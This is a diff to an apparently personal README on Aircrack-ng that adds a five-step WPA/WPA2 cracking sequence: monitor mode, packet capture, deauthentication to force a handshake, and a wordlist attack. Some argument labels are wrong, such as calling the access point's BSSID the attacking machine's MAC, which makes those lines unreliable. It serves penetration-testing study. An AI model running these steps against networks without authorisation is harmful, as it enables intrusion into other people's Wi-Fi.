@@ -30,15 +30,21 @@ Part of the Aircrack suite, Airmon-ng is a complete suite of tools used to acces
 ### Pre-Requisites
 + git
 + make
+- Available WiFi network interface for a target (i.e. wlan0)
+	- using *ip*
+        ```console
+        ip a s
+        ```
+    
+    - using ifconfig
+        ```console
+        ifconfig
+        ```
 
-- Check your network interface for a target
-	```console
-	# using ip a s
-	ip a s
-
-	# using iwconfig
-	iwconfig
-	```
+	- using iwconfig
+        ```console
+        iwconfig
+        ```
 
 ### Dependencies
 + build-essential 
@@ -177,9 +183,39 @@ Part of the Aircrack suite, Airmon-ng is a complete suite of tools used to acces
 	aircrack-ng -w wordlist.dic -b 00:11:22:33:44:55 WPAcrack.cap
 	```
 
+### Sequence
+> This sequence will change according to your interface as it is just a Proof-of-Concept
+1. Put our Wireless Network Interface into Monitor Mode
+    - using *airmon-ng*
+        ```console
+        airmon-ng start wlan0
+        ```
+2. Get Access Point's MAC Address that you are targeting 
+    - using *airodump-ng*
+        ```console
+        airodump-ng wlan0mon
+        ```
+3. Capture Packets between Access Point and Client (Represented by STATION) and Save them in the *pentestdump* file
+    - using *airodump-ng*
+        + bssid : MAC Address of Attacking Machine
+        ```console
+        airodump-ng -c 11 --bssid [Access Point MAC address] -w [write-output-file] [wireless-network-interface]
+        ```
+4. Force four-way handshake
+    - using *aireplay-ng* for faster result
+        ```console
+        aireplay-ng -0 1 -a [attacking machine MAC address] -c [target machine MAC address] [wireless-network-interface]
+        ```
+5. Crack WiFi password and write to file 'password.lst'
+    - using *aircrack-ng*
+        ```console
+        aircrack-ng -w [wordlist-file] -b [Access Point MAC address] [input-packet-filename]
+        ```
+
 ## Resources
 
 ## References
++ [Hakin9 - Crack WPA/WPA2 Wi-Fi Routers with Aircrack-ng and Hashcat](https://hakin9.org/crack-wpa-wpa2-wi-fi-routers-with-aircrack-ng-and-hashcat/)
 
 ## Remarks
 
